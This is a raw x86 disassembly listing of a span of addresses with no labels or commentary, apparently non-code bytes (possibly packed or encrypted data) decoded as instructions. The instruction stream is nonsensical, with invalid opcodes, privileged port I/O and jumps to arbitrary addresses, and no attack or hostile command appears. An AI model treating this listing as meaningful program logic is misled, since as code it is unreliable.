  403f1b:	in     eax,dx
  403f1c:	jmp    0x403f8e
  403f1e:	pusha  
  403f1f:	xor    eax,0x3546bafb
  403f24:	cmc    
  403f25:	repz add eax,0xdd0302d4
  403f2b:	sahf   
  403f2c:	push   ss
  403f2d:	xchg   edi,eax
  403f2e:	or     dl,dl
  403f30:	mov    BYTE PTR [ebx+0x69],ah
  403f33:	out    dx,al
  403f34:	out    0xa3,eax
  403f36:	jo     0x403f36
  403f38:	mov    dh,0x87
  403f3a:	pop    ss
  403f3b:	ins    BYTE PTR es:[edi],dx
  403f3c:	push   cs
  403f3d:	cmp    DWORD PTR [ebx+0x3a],esp
  403f40:	jae    0x403f92
  403f42:	inc    ecx
  403f43:	je     0x403f65
  403f45:	fisttp WORD PTR [eax-0x3efaf9ab]
  403f4b:	xor    eax,esi
  403f4d:	xchg   edi,eax
  403f4e:	std    
  403f4f:	lock rcl BYTE PTR [edi+0x67],cl
  403f53:	int3   
  403f54:	sbb    DWORD PTR [ecx-0x53],0xffffffea
  403f58:	sub    eax,0xb45024b1
  403f5d:	mov    dh,0xdb
  403f5f:	mov    esp,0x689a448c
  403f64:	loope  0x403f6a
  403f66:	aad    0x14
  403f68:	and    eax,0x9feec596
  403f6d:	cs (bad) 
  403f70:	jl     0x403f8e
  403f72:	sub    dl,0x52
  403f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f76:	shr    DWORD PTR [ecx],cl
  403f78:	icebp  
  403f79:	je     0x403fb2
  403f7b:	inc    ebx
  403f7c:	dec    eax
  403f7d:	stos   DWORD PTR es:[edi],eax
  403f7e:	cmp    edx,DWORD PTR [ebx-0x6445410f]
  403f84:	(bad)  
  403f85:	loopne 0x403fe0
  403f87:	std    
  403f88:	dec    eax
  403f89:	ret    
  403f8a:	and    al,0x23
  403f8c:	push   0x14
  403f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8f:	mov    ch,0x83
  403f91:	test   dl,bl
  403f93:	or     eax,0x30911f1d
  403f98:	pop    eax
  403f99:	pop    ss
  403f9a:	xor    eax,DWORD PTR [edi+0x95786ab]
  403fa0:	pop    esp
  403fa1:	jne    0x403ff1
  403fa3:	fsubr  DWORD PTR [esi+0x63b572ea]
  403fa9:	jns    0x403f45
  403fab:	(bad)  
  403fac:	je     0x403ff7
  403fae:	les    ebx,FWORD PTR [eax-0x3dd3c8b4]
  403fb4:	je     0x403ff3
  403fb6:	out    dx,eax
  403fb7:	nop
  403fb8:	and    BYTE PTR [edx],dh
  403fba:	(bad)  
  403fbb:	out    dx,eax
  403fbc:	dec    edi
  403fbd:	popf   
  403fbe:	pop    es
  403fbf:	cmp    ch,bl
  403fc1:	lock mov edx,0x213e5e91
  403fc7:	inc    ebp
  403fc8:	sbb    DWORD PTR [esi],ecx
  403fca:	repz inc ecx
  403fcc:	dec    edx
  403fcd:	mov    edx,0x44f5d75f
  403fd2:	test   DWORD PTR [ecx+0x686116c6],ebp
  403fd8:	in     eax,0x3d
  403fda:	inc    edx
  403fdb:	out    dx,al
  403fdc:	ja     0x403fbe
  403fde:	cwde   
  403fdf:	sbb    al,0x80
  403fe1:	cli    
  403fe2:	aam    0xf5
  403fe4:	push   ebp
  403fe5:	das    
  403fe6:	out    0x2b,eax
  403fe8:	mov    ds:0x12ee098c,eax
  403fed:	int    0xb7
  403fef:	inc    esp
  403ff0:	mov    bl,cl
  403ff2:	popa   
  403ff3:	test   al,bl
  403ff5:	and    eax,0xffd02d7b
  403ffa:	or     al,0x8a
  403ffc:	shr    DWORD PTR [eax+0x423cc672],1
  404002:	leave  
  404003:	fstp   TBYTE PTR [esi]
  404005:	enter  0x7c02,0xf7
  404009:	push   ebp
  40400a:	nop
  40400b:	pop    esi
  40400c:	xor    edi,edi
  40400e:	sub    al,0x20
  404010:	es xchg ecx,eax
  404012:	mov    ebp,0xded73303
  404017:	add    bh,BYTE PTR [esi]
  404019:	push   ecx
  40401a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40401c:	mov    edi,0xba5457d3
  404021:	and    al,0xb9
  404023:	imul   ebx,DWORD PTR [edx],0xe3c33384
  404029:	stos   DWORD PTR es:[edi],eax
  40402a:	arpl   WORD PTR [ecx+0x77],si
  40402d:	pushf  
  40402e:	(bad)  
  40402f:	mov    esi,0x44763a32
  404034:	loopne 0x403ffb
  404036:	lds    ebp,FWORD PTR [ebx-0x191512d0]
  40403c:	inc    edi
  40403d:	call   0xa6b6:0x2158072d
  404044:	pop    esp
  404045:	dec    edx
  404046:	daa    
  404047:	loop   0x40401d
  404049:	aas    
  40404a:	in     eax,0x26
  40404c:	lahf   
  40404d:	enter  0xbbe4,0x5e
  404051:	out    0xcd,al
  404053:	cmovg  ebp,esi
  404056:	in     al,0x49
  404058:	add    BYTE PTR [edi+esi*2-0xa],bh
  40405c:	into   
  40405d:	mov    bl,0x54
  40405f:	mov    cl,0x85
  404061:	mov    BYTE PTR [eax+0x48308826],bh
  404067:	dec    edx
  404068:	jmp    0x8dcd757f
  40406d:	mov    edi,0x7a1ec6ae
  404072:	sub    DWORD PTR cs:[edi+eax*1-0x17],0x2cb654d2
  40407b:	loopne 0x404083
  40407d:	mov    ds:0x6851721e,al
  404082:	cmp    al,0xd7
  404084:	out    0x96,eax
  404086:	pop    es
  404087:	pushf  
  404088:	shl    BYTE PTR [ebx-0x759b5237],cl
  40408e:	hlt    
  40408f:	mov    bl,0xd3
  404091:	mov    ecx,DWORD PTR [edi]
  404093:	add    dh,BYTE PTR [ebx+0x67]
  404096:	lea    edi,es:[ebx]
  404099:	sti    
  40409a:	inc    edi
  40409b:	sub    al,BYTE PTR [esi]
  40409d:	adc    eax,esp
  40409f:	lods   al,BYTE PTR ds:[esi]
  4040a0:	and    al,0x87
  4040a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a3:	in     al,dx
  4040a4:	sbb    eax,0x96719e4
  4040a9:	push   DWORD PTR [ebx]
  4040ab:	pop    ds
  4040ac:	mov    dl,0x86
  4040ae:	arpl   WORD PTR ds:0xa68fb904,ax
  4040b4:	int    0xf7
  4040b6:	push   ss
  4040b7:	lea    eax,[ebx+0x3128e4ab]
  4040bd:	inc    edx
  4040be:	ins    BYTE PTR es:[edi],dx
  4040bf:	pop    edx
  4040c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c1:	pop    esp
  4040c2:	add    cl,ch
  4040c4:	pusha  
  4040c5:	fst    QWORD PTR [ebx+0x686809c2]
  4040cb:	sub    BYTE PTR [ecx+0x6b],ah
  4040ce:	adc    eax,0x95059ce7
  4040d3:	scas   eax,DWORD PTR es:[edi]
  4040d4:	pushf  
  4040d5:	aas    
  4040d6:	mov    cl,0xf9
  4040d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d9:	xchg   ebx,eax
  4040da:	dec    esi
  4040db:	bound  eax,QWORD PTR [ebx-0x32]
  4040de:	fistp  QWORD PTR [ebx+ebx*4+0x342f1817]
  4040e5:	(bad)  
  4040e6:	shr    ecx,cl
  4040e8:	ins    BYTE PTR es:[edi],dx
  4040e9:	xchg   ebp,eax
  4040ea:	sar    BYTE PTR [ecx-0x4e],0x4f
  4040ee:	mov    al,ds:0xbd73d9a3
  4040f3:	lods   al,BYTE PTR ds:[esi]
  4040f4:	sti    
  4040f5:	icebp  
  4040f6:	inc    edi
  4040f7:	pop    ecx
  4040f8:	jns    0x404163
  4040fa:	or     eax,0x6b699fc2
  4040ff:	out    0xf8,al
  404101:	ss addr16 mov al,0xca
  404105:	xor    DWORD PTR [edx-0x74],ebp
  404108:	pop    ss
  404109:	out    dx,al
  40410a:	xor    eax,0x147fc069
  40410f:	(bad)  
  404110:	pop    ss
  404111:	(bad)  
  404112:	mov    esi,0xbb25b310
  404117:	aas    
  404118:	jmp    0x4040a1
  40411a:	or     al,BYTE PTR [eax]
  40411c:	xor    eax,0xf59e2b41
  404121:	xor    BYTE PTR [esi+0x14d3d00a],dh
  404127:	sbb    cl,dh
  404129:	inc    esp
  40412a:	(bad)  
  40412b:	sar    DWORD PTR [eax+ebx*8+0x69],1
  40412f:	das    
  404130:	add    al,0xce
  404132:	xchg   ebx,eax
  404133:	repnz lods al,BYTE PTR ds:[esi]
  404135:	dec    esi
  404136:	mov    eax,0x28568d96
  40413b:	pop    ds
  40413c:	jecxz  0x4040ea
  40413e:	dec    esi
  40413f:	pop    edi
  404140:	dec    ebp
  404141:	xor    esp,DWORD PTR [esp+ecx*2]
  404144:	ins    BYTE PTR es:[edi],dx
  404145:	in     al,dx
  404146:	push   0xd200dde6
  40414b:	pop    ss
  40414c:	push   ecx
  40414d:	dec    eax
  40414e:	mov    ah,0xee
  404150:	dec    ebx
  404151:	cs out dx,eax
  404153:	sbb    eax,0x307cf8e5
  404158:	fstp   QWORD PTR [edi+0x3b753d4]
  40415e:	cmp    eax,0xfdf1283c
  404163:	test   BYTE PTR ss:[ebx+0x22],bl
  404167:	rol    ecx,cl
  404169:	add    ch,ch
  40416b:	pop    eax
  40416c:	dec    edx
  40416d:	(bad)  
  40416e:	jae    0x40418b
  404170:	hlt    
  404171:	xchg   ecx,eax
  404172:	mov    eax,0xe5669e16
  404177:	les    ebp,FWORD PTR [ecx+0x222f9c5e]
  40417d:	ror    DWORD PTR [edx+eax*1+0x45284635],cl
  404184:	sub    BYTE PTR [ecx],ch
  404186:	pop    ebp
  404187:	mov    dh,0x5d
  404189:	mov    edx,0x5e043122
  40418e:	add    al,0x92
  404190:	mov    cl,0x55
  404192:	std    
  404193:	pop    edx
  404194:	ds cli 
  404196:	fs addr16 push es
  404199:	call   0x897e775
  40419e:	ds push eax
  4041a0:	jl     0x404154
  4041a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a3:	arpl   ax,bx
  4041a5:	and    al,0x32
  4041a7:	push   ecx
  4041a8:	or     DWORD PTR [eax],0x780992f3
  4041ae:	jge    0x404130
  4041b0:	push   ss
  4041b1:	and    ebp,DWORD PTR [eax+0x3831da64]
  4041b7:	adc    al,0x64
  4041b9:	jae    0x4041b5
  4041bb:	rol    cl,0xcf
  4041be:	push   0xffffffcc
  4041c0:	mov    eax,ds:0xdb914c21
  4041c5:	or     al,0x64
  4041c7:	(bad)
  4041cb:	xchg   ecx,eax
  4041cc:	lods   al,BYTE PTR ds:[esi]
  4041cd:	mov    ds:0x1aa4cd09,al
  4041d2:	and    al,0xc8
  4041d4:	xchg   esi,eax
  4041d5:	loope  0x40422c
  4041d7:	sub    ebx,edx
  4041d9:	hlt    
  4041da:	mov    ds:0x39824196,eax
  4041df:	sbb    DWORD PTR [edi+edi*4],edi
  4041e2:	mov    bl,ah
  4041e4:	xchg   edi,eax
  4041e5:	arpl   WORD PTR [eax+0x2d],bp
  4041e8:	sub    ecx,DWORD PTR [ecx+0x4f]
  4041eb:	jp     0x404208
  4041ed:	lods   eax,DWORD PTR ds:[esi]
  4041ee:	scas   eax,DWORD PTR es:[edi]
  4041ef:	(bad)  
  4041f0:	or     ecx,esp
  4041f2:	(bad)  
  4041f3:	(bad)  
  4041f5:	idiv   ah
  4041f7:	cmp    eax,0xe6daf824
  4041fc:	pop    esi
  4041fd:	in     al,0x41
  4041ff:	pop    eax
  404200:	push   ebx
  404201:	sub    al,dl
  404203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404204:	aaa    
  404205:	rcr    dh,cl
  404207:	add    al,0x25
  404209:	popa   
  40420a:	dec    esi
  40420b:	inc    esi
  40420c:	lock push es
  40420e:	(bad)  
  40420f:	mov    ds:0x7d0b9e65,al
  404214:	push   esp
  404215:	dec    eax
  404216:	xchg   ecx,eax
  404217:	cmp    bh,BYTE PTR [edx+0x691b5228]
  40421d:	adc    ebp,esp
  40421f:	inc    ebp
  404220:	pop    edi
  404221:	call   0xa3b1e91d
  404226:	mov    ah,dl
  404228:	fisub  DWORD PTR [esi+0xd]
  40422b:	ja     0x404209
  40422d:	imul   edi,DWORD PTR [ebp+0x24],0x94d7ba56
  404234:	bnd jne 0x404254
  404237:	pushf  
  404238:	cmp    dh,cl
  40423a:	or     BYTE PTR [edx+0x68],ch
  40423d:	sub    dh,BYTE PTR ds:0xc470863e
  404243:	lds    ecx,FWORD PTR [esi+0x39]
  404246:	cli    
  404247:	gs scas eax,DWORD PTR es:[edi]
  404249:	jbe    0x40421f
  40424b:	bound  ecx,QWORD PTR [eax+eax*4-0x54]
  40424f:	shl    BYTE PTR [ecx],1
  404251:	ja     0x404233
  404253:	loop   0x4041fc
  404255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404256:	cs pop edi
  404258:	add    eax,0xa04ee63c
  40425d:	mov    cl,0x2c
  40425f:	(bad)  
  404260:	out    0x76,eax
  404262:	iret   
  404263:	ins    DWORD PTR es:[edi],dx
  404264:	ret    0x2188
  404267:	iret   
  404268:	or     ch,BYTE PTR [edi+0x3a9b172]
  40426e:	fsub   DWORD PTR [edx+0x2cdb18b0]
  404274:	lods   al,BYTE PTR ds:[esi]
  404275:	pop    ebp
  404276:	xchg   esi,eax
  404277:	or     ebx,DWORD PTR [esi+edx*2]
  40427a:	sti    
  40427b:	outs   dx,BYTE PTR ds:[esi]
  40427c:	fist   DWORD PTR [ebx+0x44]
  40427f:	das    
  404280:	in     al,0x7a
  404282:	cmp    DWORD PTR [esi-0x58e61fb4],edi
  404288:	jg     0x404276
  40428a:	jmp    0x4042cb
  40428c:	loopne 0x404276
  40428e:	push   esi
  40428f:	mov    ds:0x44f96c01,eax
  404294:	jmp    0xf0d6825a
  404299:	adc    al,0x2b
  40429b:	jne    0x404281
  40429d:	sub    al,0x5a
  40429f:	mov    esi,DWORD PTR [edx]
  4042a1:	fisubr DWORD PTR fs:[ebx]
  4042a4:	sbb    al,0xfe
  4042a6:	cld    
  4042a7:	pop    es
  4042a8:	add    esp,esi
  4042aa:	repz or bh,bh
  4042ad:	pop    es
  4042ae:	pop    ds
  4042af:	or     eax,0xe20f1547
  4042b4:	pop    es
  4042b5:	icebp  
  4042b6:	xchg   edx,eax
  4042b7:	shl    ebp,cl
  4042b9:	add    DWORD PTR [eax-0x2c1d014e],0x27d092b7
  4042c3:	into   
  4042c4:	or     edx,DWORD PTR [edx]
  4042c6:	shl    BYTE PTR [edi+0x64],1
  4042c9:	outs   dx,DWORD PTR ds:[esi]
  4042ca:	fild   QWORD PTR [ecx]
  4042cc:	fadd   DWORD PTR [ebp+0x78]
  4042cf:	out    dx,al
  4042d0:	and    al,0x17
  4042d2:	push   edi
  4042d4:	bound  ebp,QWORD PTR [esi+0x45eed0fc]
  4042da:	ds retf 
  4042dc:	lahf   
  4042dd:	push   esp
  4042de:	loop   0x40435f
  4042e0:	clc    
  4042e1:	and    al,0xfb
  4042e3:	out    0xbf,al
  4042e5:	lahf   
  4042e6:	and    BYTE PTR [edi+ecx*2-0x26c055d5],0x2a
  4042ee:	adc    DWORD PTR [ecx],esi
  4042f0:	xchg   ebx,eax
  4042f1:	inc    eax
  4042f2:	sub    ebx,DWORD PTR [ebp+0x12fb8c22]
  4042f8:	jo     0x404297
  4042fa:	repnz xchg edi,eax
  4042fc:	cmp    DWORD PTR [edi],eax
  4042fe:	push   eax
  4042ff:	or     ebp,DWORD PTR [eax-0x4847beb6]
  404305:	retf   0x8357
  404308:	pushf  
  404309:	jmp    0x4042b1
  40430b:	in     al,dx
  40430c:	and    ecx,ebp
  40430e:	and    esi,esp
  404310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404312:	mul    ch
  404314:	or     cl,BYTE PTR [eax+0x41915234]
  40431a:	sbb    esi,DWORD PTR [ebx-0x678c39c3]
  404320:	push   ecx
  404321:	pop    ss
  404322:	je     0x4042e2
  404324:	mov    eax,ds:0x82366a53
  404329:	inc    ebp
  40432a:	dec    ebp
  40432b:	jo     0x4043a7
  40432d:	scas   eax,DWORD PTR es:[edi]
  40432e:	les    eax,FWORD PTR [esi+edi*1-0x16]
  404332:	popa   
  404333:	daa    
  404334:	out    dx,eax
  404335:	call   0x8da17eab
  40433a:	int3   
  40433b:	xor    bh,dh
  40433d:	fucom  st(1)
  40433f:	in     eax,0x2f
  404341:	push   es
  404342:	lahf   
  404343:	pop    ss
  404344:	mov    ebp,0x52e1076e
  404349:	push   0x1822b66d
  40434e:	mov    edi,0x6b39e5b4
  404353:	jae    0x40436d
  404355:	fbld   TBYTE PTR [edx+0x76]
  404358:	cdq    
  404359:	inc    ebp
  40435a:	push   cs
  40435b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40435c:	add    BYTE PTR [ecx+0x1780d3b3],bl
  404362:	cmc    
  404363:	xchg   DWORD PTR gs:[edi],ebp
  404366:	mov    cl,0xe4
  404368:	mov    dl,0xaf
  40436a:	cmp    eax,0xfa275384
  40436f:	push   ss
  404370:	xor    ah,ch
  404372:	mov    ds:0x59007561,eax
  404377:	les    esi,FWORD PTR [eax-0x69797dae]
  40437d:	mov    eax,esp
  40437f:	push   ebx
  404380:	fdivrp st(2),st
  404382:	scas   al,BYTE PTR es:[edi]
  404383:	shl    ah,1
  404385:	repz mov esi,0xd955cbb5
  40438b:	js     0x4043b2
  40438d:	out    dx,al
  40438e:	sbb    al,0xa3
  404390:	call   0xed10690c
  404395:	pusha  
  404396:	jmp    0x99a4ec4
  40439b:	rcr    DWORD PTR [eax],1
  40439d:	inc    ebx
  40439e:	pop    eax
  40439f:	addr16 es cs inc ebx
  4043a3:	inc    esp
  4043a4:	xchg   si,ax
  4043a6:	adc    eax,0xc39bb059
  4043ab:	outs   dx,BYTE PTR ds:[esi]
  4043ac:	outs   dx,DWORD PTR ds:[esi]
  4043ad:	dec    edx
  4043ae:	lods   eax,DWORD PTR ds:[esi]
  4043af:	fld    QWORD PTR [edi+ebx*8+0x46]
  4043b3:	inc    DWORD PTR [eax-0x7b5a6231]
  4043b9:	inc    ebx
  4043ba:	lahf   
  4043bb:	call   0xfaebfb15
  4043c0:	dec    edi
  4043c1:	out    0x10,al
  4043c3:	jmp    0xf3f8c0e3
  4043c8:	call   0xdf38d1c9
  4043cd:	(bad)  
  4043ce:	lods   eax,DWORD PTR ds:[esi]
  4043cf:	std    
  4043d0:	imul   eax,DWORD PTR [esi+0x7a52a679],0x74f90c42
  4043da:	sbb    eax,0xa7381f04
  4043df:	ja     0x4043af
  4043e1:	xchg   ebp,eax
  4043e2:	retf   
  4043e3:	push   cs
  4043e4:	adc    edx,DWORD PTR [edi+0x64]
  4043e7:	ror    DWORD PTR [edx],0xff
  4043ea:	(bad)  
  4043eb:	test   eax,0x689d480e
  4043f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f1:	sub    bh,BYTE PTR [eax]
  4043f3:	idiv   DWORD PTR [eax+0x1f]
  4043f6:	(bad)  
  4043f7:	xchg   edx,eax
  4043f8:	(bad)  
  4043fa:	icebp  
  4043fb:	sub    eax,0x270a4432
  404400:	stc    
  404401:	and    DWORD PTR ss:[esi+0x600950f7],edx
  404408:	push   edi
  404409:	test   DWORD PTR ds:0x210e006a,eax
  40440f:	sbb    BYTE PTR [esi+edi*8],dh
  404412:	pop    ss
  404413:	dec    esp
  404414:	retf   
  404415:	sbb    dl,BYTE PTR [edi]
  404417:	dec    edi
  404418:	sub    eax,0x3bebd5d7
  40441d:	hlt    
  40441e:	aaa    
  40441f:	jo     0x404467
  404421:	std    
  404422:	out    0xf1,al
  404424:	outs   dx,DWORD PTR ds:[esi]
  404425:	shl    DWORD PTR ds:0x6a5d27c8,cl
  40442b:	cmp    eax,0x7a
  40442e:	daa    
  40442f:	data16 add al,0xab
  404432:	jmp    0xf7fd:0xe72ee0b1
  404439:	lock ret 
  40443b:	in     eax,dx
  40443c:	sti    
  40443d:	ret    
  40443e:	fisttp QWORD PTR [esi-0x55b138c2]
  404444:	bound  edx,QWORD PTR [ebx]
  404446:	les    ebx,FWORD PTR [esi-0x2c]
  404449:	adc    al,BYTE PTR [ecx-0x22]
  40444c:	xchg   esi,ecx
  40444e:	push   0x23eb2290
  404453:	imul   edi,DWORD PTR [edi+0x3ab75df2],0xef2e567
  40445d:	loop   0x404452
  40445f:	test   eax,0x4375fe50
  404464:	sub    eax,0xd1a8d4ea
  404469:	push   edi
  40446a:	les    esi,FWORD PTR [eax+0x51a7c713]
  404470:	mov    esi,0x195c6efc
  404475:	mov    ecx,0x45093f4b
  40447a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40447b:	push   ds
  40447c:	jg     0x4044cc
  40447e:	fdivr  QWORD PTR [esi-0x25db9ab3]
  404484:	xchg   edi,eax
  404485:	and    DWORD PTR [ecx+0x53175298],eax
  40448b:	push   cs
  40448c:	push   0x12
  40448e:	in     al,0xac
  404490:	push   0x79
  404492:	jo     0x4044a9
  404494:	test   edi,ebp
  404496:	jne    0x40445d
  404498:	inc    esp
  404499:	test   eax,0x31bb0e77
  40449e:	bound  edx,QWORD PTR [eax+0x57]
  4044a1:	and    ah,BYTE PTR [eax+0x5f]
  4044a4:	and    cl,BYTE PTR [edi]
  4044a6:	std    
  4044a7:	je     0x404455
  4044a9:	dec    ebx
  4044aa:	xor    eax,0xfb77ac76
  4044af:	lahf   
  4044b0:	cmp    dh,0xfa
  4044b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044b4:	add    ch,BYTE PTR [esi]
  4044b6:	ret    0xa8a6
  4044b9:	shl    BYTE PTR ds:0xf2498735,1
  4044bf:	loope  0x404459
  4044c1:	sbb    DWORD PTR [ecx+0x77],ebx
  4044c4:	xchg   ebp,eax
  4044c5:	cdq    
  4044c6:	push   ebx
  4044c7:	inc    edi
  4044c8:	icebp  
  4044c9:	loopne 0x4044ca
  4044cb:	dec    edx
  4044cc:	shl    BYTE PTR [ebx+0x1c1b48ab],0x67
  4044d3:	imul   ecx,esp,0xd2fcb04f
  4044d9:	fnstsw WORD PTR [esi+0x88f04b2]
  4044df:	mov    BYTE PTR ds:0x693f8157,bh
  4044e5:	sbb    BYTE PTR ds:0xcb6da859,al
  4044eb:	jnp    0x4044d2
  4044ed:	mov    ch,0x9b
  4044ef:	push   0xffffffd5
  4044f1:	pop    ecx
  4044f2:	aas    
  4044f3:	js     0x404557
  4044f5:	test   eax,0xfc908e6c
  4044fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fb:	mov    dl,0x32
  4044fd:	add    DWORD PTR [eax-0x68],esi
  404500:	mov    ch,0x17
  404502:	out    0x87,al
  404504:	rcr    BYTE PTR [edx],cl
  404506:	neg    BYTE PTR [ebx+0x70b6453]
  40450c:	jg     0x4044d5
  40450e:	mov    edx,0x3ae5854a
  404513:	mov    ds,WORD PTR [eax-0x6c9cba80]
  404519:	shrd   DWORD PTR [esi+ebx*1],edi,0xaf
  40451e:	xchg   edi,eax
  40451f:	inc    edi
  404520:	bsf    eax,DWORD PTR [edx+0x64cf8daa]
  404527:	shl    eax,cl
  404529:	(bad)
  40452c:	dec    edi
  40452d:	xchg   edi,eax
  40452e:	dec    ecx
  40452f:	xchg   bh,bl
  404531:	mov    eax,eax
  404533:	ficom  WORD PTR [esp+eax*2]
  404536:	jge    0x4044dc
  404538:	data16 outs dx,BYTE PTR ds:[esi]
  40453a:	(bad)  [ebx]
  40453c:	scas   eax,DWORD PTR es:[edi]
  40453d:	mov    edx,0xe783d1fc
  404542:	mov    eax,ds:0x6e6abed3
  404547:	cs mov dl,0xef
  40454a:	jne    0x40456f
  40454c:	das    
  40454d:	xor    eax,0x75bfe5f0
  404552:	leave  
  404553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404555:	xchg   edx,eax
  404556:	aaa    
  404557:	sbb    BYTE PTR [eax-0x3bb37e53],bl
  40455d:	mov    ds:0x55d5c208,eax
  404562:	xchg   BYTE PTR [ecx+eax*4+0x45a77a21],dl
  404569:	fidivr WORD PTR [eax-0x3c]
  40456c:	xchg   ecx,eax
  40456d:	xor    BYTE PTR [ebx+0x5d0d639b],bl
  404573:	jb     0x4045dd
  404575:	jne    0x4045f2
  404577:	xchg   edi,eax
  404578:	mov    ebp,0x49468103
  40457d:	xchg   edi,eax
  40457e:	dec    esi
  40457f:	inc    edi
  404580:	repnz add BYTE PTR [edi],0x89
  404584:	mov    ds:0x62dc60a9,eax
  404589:	and    DWORD PTR ds:0x72d3670c,0xc64a2ccd
  404593:	adc    esi,DWORD PTR [ecx-0x4310bee5]
  404599:	xor    BYTE PTR [ebx+0x0],ch
  40459c:	aaa    
  40459d:	dec    esp
  40459e:	fbstp  TBYTE PTR [eax]
  4045a0:	call   DWORD PTR [edx-0x2ed238c]
  4045a6:	mov    ah,0xde
  4045a8:	push   edi
  4045a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045aa:	jbe    0x404605
  4045ac:	mov    ebp,ebp
  4045ae:	sbb    esp,DWORD PTR [edi]
  4045b0:	clc    
  4045b1:	xchg   edi,eax
  4045b2:	jns    0x4045cd
  4045b4:	mov    DWORD PTR [esi],esi
  4045b6:	jmp    0x5a1e557
  4045bb:	iret   
  4045bc:	mov    bl,0xa
  4045be:	fisubr WORD PTR [esp+ebx*4-0xe63c82d]
  4045c5:	clc    
  4045c6:	test   al,0xfd
  4045c8:	sti    
  4045c9:	jne    0x40455b
  4045cb:	fs clc 
  4045cd:	mov    ebp,DWORD PTR [eax+0x455cfdf9]
  4045d3:	hlt    
  4045d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045d5:	jo     0x4045b6
  4045d7:	pop    es
  4045d8:	out    0x9a,eax
  4045da:	inc    edi
  4045db:	inc    edi
  4045dc:	js     0x4045b9
  4045de:	xchg   edi,eax
  4045df:	arpl   WORD PTR [ebp+0x59566729],cx
  4045e5:	(bad)  
  4045e7:	cld    
  4045e8:	cdq    
  4045e9:	add    BYTE PTR [esi+0x42],0x11
  4045ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ee:	mov    dl,0x54
  4045f0:	out    dx,al
  4045f1:	fs cwde 
  4045f3:	jae    0x404604
  4045f5:	xchg   esp,eax
  4045f6:	cmp    esi,ebx
  4045f8:	mov    esi,0x93613432
  4045fd:	call   0x2be2:0x6cbbe6e8
  404604:	mov    esi,0x8bf3a41d
  404609:	sbb    al,0x82
  40460b:	mov    ds:0x180231bb,eax
  404610:	dec    eax
  404611:	jb     0x4045e9
  404613:	imul   edi,DWORD PTR [ecx+0x465ac7a4],0xffffffd4
  40461a:	call   0x4d2bebd8
  40461f:	mov    DWORD PTR [eax],esp
  404621:	xor    bh,BYTE PTR [ebx]
  404623:	idiv   DWORD PTR [esi+eiz*2+0x7c]
  404627:	push   ecx
  404628:	add    ebp,eax
  40462a:	add    BYTE PTR [edx+0x3],ch
  40462d:	sub    eax,0x44edb172
  404632:	mov    al,0x4b
  404634:	loope  0x4046a9
  404636:	nop
  404637:	hlt    
  404638:	cmp    bh,bl
  40463a:	mov    ebp,0x91048a4b
  40463f:	jo     0x404643
  404641:	lods   al,BYTE PTR ds:[esi]
  404642:	xor    al,al
  404644:	out    0x28,eax
  404646:	xchg   ecx,eax
  404647:	inc    esi
  404648:	mov    ecx,0x7b408fb0
  40464d:	xchg   edi,eax
  40464e:	ficom  WORD PTR cs:[esi-0x4ebb8bfb]
  404655:	xchg   esp,eax
  404656:	or     esi,DWORD PTR [edi-0x15fd51f4]
  40465c:	mov    edx,ds
  40465e:	pop    esp
  40465f:	retf   
  404660:	and    al,0xec
  404662:	mov    DWORD PTR [esi],esp
  404664:	xchg   edx,eax
  404665:	pop    ecx
  404666:	xchg   edi,eax
  404667:	in     eax,dx
  404668:	ficom  DWORD PTR [ebx]
  40466a:	loope  0x4046c8
  40466c:	loope  0x40460c
  40466e:	das    
  40466f:	test   BYTE PTR [esi+0x4b318dbd],cl
  404675:	xchg   DWORD PTR [edi],esi
  404677:	fcomp  st(0)
  404679:	inc    ebx
  40467a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467b:	jbe    0x404650
  40467d:	ja     0x4046cf
  40467f:	fwait
  404680:	je     0x4046d9
  404682:	mov    dh,0x37
  404684:	int    0x2d
  404686:	mov    eax,ds:0x27aa9aaf
  40468b:	jg     0x404644
  40468d:	mov    dl,0x33
  40468f:	js     0x404656
  404691:	es xchg ebp,eax
  404693:	pop    edx
  404694:	push   ds
  404695:	pusha  
  404696:	(bad)  
  404697:	(bad)  
  404698:	scas   al,BYTE PTR es:[edi]
  404699:	mov    BYTE PTR [eax-0x25d54d1],ah
  40469f:	retf   0x5db5
  4046a2:	gs ret 0xee76
  4046a6:	data16 jle 0x40467d
  4046a9:	push   es
  4046aa:	or     eax,0x7d5af9f3
  4046af:	ss jb  0x404666
  4046b2:	pushf  
  4046b3:	mov    ds:0xe83dc551,eax
  4046b8:	fs dec ebx
  4046ba:	pushf  
  4046bb:	push   ebx
  4046bc:	xor    eax,0x7e4f7691
  4046c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c2:	inc    ebx
  4046c3:	cmp    BYTE PTR ds:0x922740b7,ch
  4046c9:	call   FWORD PTR fs:[ecx-0x50915b86]
  4046d0:	mov    dl,0x10
  4046d2:	sbb    BYTE PTR [edx],0xc5
  4046d5:	jmp    0x40469c
  4046d7:	loop   0x4046f0
  4046d9:	fucomip st,st(4)
  4046db:	inc    esp
  4046dc:	(bad)  
  4046dd:	minps  xmm3,xmm4
  4046e0:	loopne 0x40467b
  4046e2:	push   0xffffffb1
  4046e4:	jg     0x4046f7
